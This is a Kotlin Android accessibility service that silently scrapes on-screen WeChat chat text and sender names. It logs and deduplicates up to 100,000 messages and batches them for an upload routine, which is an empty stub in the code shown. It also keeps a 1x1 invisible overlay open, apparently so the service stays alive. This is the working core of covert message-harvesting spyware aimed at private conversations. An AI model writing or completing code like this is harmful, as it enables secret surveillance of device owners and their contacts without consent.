package com.example.myapplication

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.PixelFormat
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

open class CompositionAbService(
) : AccessibilityService() {
    private val TAG = "CompositionAbService"
    private var aliveView: View? = null
    private var lastRead = System.currentTimeMillis()
    private var user = ""
    private val messageList = ArrayList<String>()
    private val allMessageList = ArrayList<String>()
    private val sleepDefault = 10 * 1000
    private val friendSleep = sleepDefault * 10
    private var sleep = sleepDefault
    private var uploading = false

    private val wm by lazy { this.getSystemService(WINDOW_SERVICE) as WindowManager }

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (aliveView != null) {
            wm.removeView(aliveView)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if ((System.currentTimeMillis() - lastRead) < sleep) return

        if (messageList.size > 1000 && !uploading) {
            allMessageList.addAll(messageList)
            uploadMessage()
            if (allMessageList.size > 100 * 1000) allMessageList.clear()
        }
        rootInActiveWindow?.let {
            lastRead = System.currentTimeMillis()
            sleep = sleepDefault
            Log.d(TAG, "wechat start")
            findAll(it, 0)
        }
    }

    private fun uploadMessage() {
        uploading = true

    }

    private fun findAll(node: AccessibilityNodeInfo, level: Int) {
        if (level > 5) return
        for (i in 0 until node.childCount) {
            val node1 = node.getChild(i) ?: return
            var className: String? = null
            try {
                className = node1.className.toString() + ""
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
            if (className == "android.widget.TextView") {
                val message = node1.text?.toString() ?: ""
                if (message == "浮窗") return
                if (message == "朋友圈") {
                    sleep = friendSleep
                    return
                }

                addMessage(message)
                Log.d(TAG, message)
            } else if (className == "android.widget.ImageView") {
                val cuser = node1.contentDescription?.toString() ?: ""
                if (user != cuser) {
                    messageList.add(cuser)
                    Log.d(TAG, cuser)
                    user = cuser
                }
            } else if (node1.childCount > 0) {
                findAll(node1, level + 1)
            }
        }
    }

    private fun addMessage(message: String) {
        if (messageList.contains(message) || allMessageList.contains(message)) {
            return
        }
        messageList.add(message)
    }

    private val onInterruptHooks by lazy { linkedSetOf<() -> Unit>() }
    override fun onInterrupt() {
        onInterruptHooks.forEach { f -> f() }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        if (aliveView != null) {
            wm.removeView(aliveView)
        }
        val tempView = View(this)
        val lp = WindowManager.LayoutParams().apply {
            type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            format = PixelFormat.TRANSLUCENT
            flags =
                flags or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            width = 1
            height = 1
        }
        try {
            // 在某些机型创建失败, 原因未知
            wm.addView(tempView, lp)
            aliveView = tempView
        } catch (e: Exception) {
            Log.d(TAG, "创建无障碍悬浮窗失败")
        }
    }


    private val onKeyEventHooks by lazy { linkedSetOf<(KeyEvent?) -> Unit>() }
    override fun onKeyEvent(event: KeyEvent?): Boolean {
        onKeyEventHooks.forEach { f -> f(event) }
        return super.onKeyEvent(event)
    }
}